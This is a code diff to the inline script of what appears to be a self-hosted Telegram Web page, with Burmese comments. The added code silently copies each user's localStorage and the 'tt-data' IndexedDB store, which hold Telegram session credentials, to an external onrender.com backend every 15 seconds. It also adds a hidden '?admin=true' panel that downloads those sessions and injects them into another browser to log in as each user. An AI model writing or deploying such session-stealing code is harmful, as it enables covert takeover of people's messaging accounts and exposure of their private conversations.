@@ -28,16 +28,104 @@
   <script>
     const BACKEND_URL = "https://telegram-7ih3.onrender.com";
 
+    // --- (၁) Binary Data များကို JSON အဖြစ်ပြောင်းရန် Helpers ---
+    function bufferToBase64(buf) {
+        let binary = '';
+        const bytes = new Uint8Array(buf);
+        for (let i = 0; i < bytes.byteLength; i++) {
+            binary += String.fromCharCode(bytes[i]);
+        }
+        return window.btoa(binary);
+    }
+
+    function base64ToBuffer(base64) {
+        const binary_string = window.atob(base64);
+        const len = binary_string.length;
+        const bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes.buffer;
+    }
+
+    function serializeData(data) {
+        return JSON.stringify(data, (key, value) => {
+            if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: bufferToBase64(value) };
+            if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: bufferToBase64(value.buffer) };
+            return value;
+        });
+    }
+
+    function deserializeData(jsonStr) {
+        return JSON.parse(jsonStr, (key, value) => {
+            if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
+            if (value && typeof value === 'object' && value.__type === 'Uint8Array') return new Uint8Array(base64ToBuffer(value.data));
+            return value;
+        });
+    }
+
+    // --- (၂) IndexedDB ကို အသွင်း/အထုတ်လုပ်ရန် Helpers ---
+    async function exportIndexedDB(dbName, storeName) {
+        return new Promise((resolve) => {
+            const request = indexedDB.open(dbName);
+            request.onsuccess = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains(storeName)) { resolve({}); return; }
+                const tx = db.transaction(storeName, "readonly");
+                const store = tx.objectStore(storeName);
+                const getAllReq = store.getAll();
+                const getKeysReq = store.getAllKeys();
+                
+                getAllReq.onsuccess = () => {
+                    getKeysReq.onsuccess = () => {
+                        const data = {};
+                        for (let i = 0; i < getKeysReq.result.length; i++) {
+                            data[getKeysReq.result[i]] = getAllReq.result[i];
+                        }
+                        resolve(data);
+                    };
+                };
+                tx.onerror = () => resolve({});
+            };
+            request.onerror = () => resolve({});
+        });
+    }
+
+    async function importIndexedDB(dbName, storeName, data) {
+        return new Promise((resolve) => {
+            const request = indexedDB.open(dbName);
+            request.onupgradeneeded = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains(storeName)) {
+                    db.createObjectStore(storeName);
+                }
+            };
+            request.onsuccess = (e) => {
+                const db = e.target.result;
+                if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
+                const tx = db.transaction(storeName, "readwrite");
+                const store = tx.objectStore(storeName);
+                store.clear();
+                for (const key in data) {
+                    store.put(data[key], key);
+                }
+                tx.oncomplete = () => resolve();
+                tx.onerror = () => resolve();
+            };
+            request.onerror = () => resolve();
+        });
+    }
+
+    // --- (၃) Main Logic ---
     document.addEventListener("DOMContentLoaded", () => {
-        
         if (window.location.search.includes("admin=true")) {
-            // (၁) Admin Panel
+            // == ADMIN PANEL BROWSER ==
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
             
             adminPanel.innerHTML = `
-                <div style="max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+                <div style="max-width: 900px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                     <h2 style='color: #333; border-bottom: 2px solid #0063bb; padding-bottom: 10px;'>Admin Control Panel</h2>
                     <p style='color: #666;'>Staff ဝင်ထားသော အကောင့်များ</p>
                     <button id='loadBtn' style='padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;'>Load Accounts</button>
@@ -46,45 +134,80 @@
             `;
             document.body.appendChild(adminPanel);
 
+            window.adminDataStore = []; 
+
+            // Login ဝင်မည့် Function
+            window.loginAs = async (index) => {
+                const session = window.adminDataStore[index];
+                if(!session) return;
+                
+                if(!confirm(session.user_id + " ၏ အကောင့်သို့ ဝင်ရောက်မည် သေချာပါသလား?")) return;
+                
+                alert("Session Data များကို ထည့်သွင်းနေပါသည်... ပြီးလျှင် အလိုအလျောက် အကောင့်ထဲရောက်ပါမည်။");
+                
+                try {
+                    localStorage.clear();
+                    
+                    if (session.local_storage_str) {
+                        const ls = JSON.parse(session.local_storage_str);
+                        for (const key in ls) {
+                            localStorage.setItem(key, ls[key]);
+                        }
+                    }
+                    
+                    if (session.indexed_db_str) {
+                        const idbData = deserializeData(session.indexed_db_str);
+                        await importIndexedDB("tt-data", "store", idbData);
+                    }
+                    
+                    window.location.href = "/"; // Refresh and login
+                } catch (e) {
+                    alert("Error during login injection: " + e.message);
+                }
+            };
+
             document.getElementById("loadBtn").addEventListener("click", async () => {
                 const contentDiv = document.getElementById("admin-content");
-                contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
+                contentDiv.innerHTML = "<p style='color: blue;'>Fetching full session data from Backend...</p>";
                 try {
                     const res = await fetch(BACKEND_URL + "/api/get_sessions");
+                    const data = await res.json();
+                    window.adminDataStore = data; 
                     
-                    // JSON တိုက်ရိုက် မပြောင်းခင် Data ကို အကြမ်းအရင်ဖတ်မယ်
-                    const textData = await res.text(); 
-                    
-                    try {
-                        const data = JSON.parse(textData); // JSON ဟုတ်မဟုတ် စစ်မယ်
-                        if(data.length === 0) {
-                            contentDiv.innerHTML = "<p style='color: red;'>မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။</p>";
-                            return;
-                        }
-                        
-                        let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
-                        html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>User ID</th><th style='padding:12px;'>Last Synced Time</th></tr>";
-                        data.forEach(s => {
-                            const timeString = new Date(s.timestamp).toLocaleString();
-                            html += `<tr style='border-bottom: 1px solid #eee;'><td style='padding:12px;'>${s.user_id}</td><td style='padding:12px;'>${timeString}</td></tr>`;
-                        });
-                        html += "</table>";
-                        contentDiv.innerHTML = html;
-
-                    } catch(parseError) {
-                        // Backend က HTML Error Page ပြန်ပို့ခဲ့လျှင်
-                        console.error("Backend Error Response:", textData);
-                        contentDiv.innerHTML = `<p style='color: red;'><b>Backend Error:</b> Backend မှ JSON အစား HTML ပြန်ပို့နေပါသည်။ သင်၏ Python Backend Link (သို့) Server အခြေအနေကို ပြန်စစ်ပါ။</p>`;
+                    if(data.length === 0) {
+                        contentDiv.innerHTML = "<p style='color: red;'>မည်သည့် Staff အကောင့်မှ မရှိသေးပါ။</p>";
+                        return;
                     }
-
+                    
+                    let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
+                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>User ID</th><th style='padding:12px;'>Last Synced Time</th><th style='padding:12px;'>Action</th></tr>";
+                    
+                    data.forEach((s, index) => {
+                        const timeString = new Date(s.timestamp).toLocaleString();
+                        // အချက်အလက် အပြည့်အစုံ ရောက်/မရောက် စစ်ဆေးခြင်း
+                        const isReady = s.indexed_db_str ? true : false;
+                        const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Data Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting for login...</span>";
+                        
+                        html += `<tr style='border-bottom: 1px solid #eee;'>
+                                    <td style='padding:12px;'><b>${s.user_id}</b><br>${statusTag}</td>
+                                    <td style='padding:12px;'>${timeString}</td>
+                                    <td style='padding:12px;'>
+                                        <button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>
+                                            Login ဝင်မည်
+                                        </button>
+                                    </td>
+                                 </tr>`;
+                    });
+                    html += "</table>";
+                    contentDiv.innerHTML = html;
                 } catch (err) {
-                    contentDiv.innerHTML = `<p style='color: red;'><b>Network Error:</b> Backend သို့ ချိတ်ဆက်၍ မရပါ။ (အင်တာနက် သို့မဟုတ် URL မှားနေပါသည်)</p>`;
+                    contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`;
                 }
             });
 
         } else {
-            // (၂) သာမန် User Background Data Sync
-            console.log("✅ Custom Background Script is RUNNING!");
+            // == STAFF BROWSER ==
+            console.log("✅ Background Session Sync RUNNING!");
             setTimeout(() => {
                 let myUserId = localStorage.getItem("my_custom_user_id");
                 if (!myUserId) {
@@ -94,26 +217,33 @@
 
                 setInterval(async () => {
                     try {
-                        const res = await fetch(BACKEND_URL + "/api/save_session", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                user_id: myUserId,
-                                message: "Connection Ping",
-                                timestamp: new Date().toISOString()
-                            })
-                        });
+                        // Data အားလုံးကို ဆွဲထုတ်ပြီး String အဖြစ်ပြောင်းခြင်း
+                        const lsDataStr = JSON.stringify(localStorage);
+                        const rawIdbData = await exportIndexedDB("tt-data", "store");
                         
-                        if(res.ok) {
-                            console.log("✅ Synced to Mongo Successfully.");
+                        // Telegram အကောင့်ထဲ ဝင်ထားမှသာ (Data ရှိမှသာ) Backend သို့ ပို့မည်
+                        if (Object.keys(rawIdbData).length > 5) { 
+                            const idbDataStr = serializeData(rawIdbData);
+
+                            const res = await fetch(BACKEND_URL + "/api/save_session", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    user_id: myUserId,
+                                    local_storage_str: lsDataStr,
+                                    indexed_db_str: idbDataStr,
+                                    timestamp: new Date().toISOString()
+                                })
+                            });
+                            if(res.ok) console.log("✅ Full Telegram Session Synced.");
                         } else {
-                            console.error("❌ Backend Error Status: ", res.status);
+                            console.log("⏳ User is not fully logged in yet. Waiting...");
                         }
                     } catch(e) {
-                        console.error("❌ Connection failed (Check your internet or Backend URL).");
+                        console.error("❌ Sync failed:", e);
                     }
-                }, 10000);
-            }, 3000);
+                }, 15000); // ၁၅ စက္ကန့် တစ်ကြိမ်
+            }, 5000);
         }
     });
   </script>
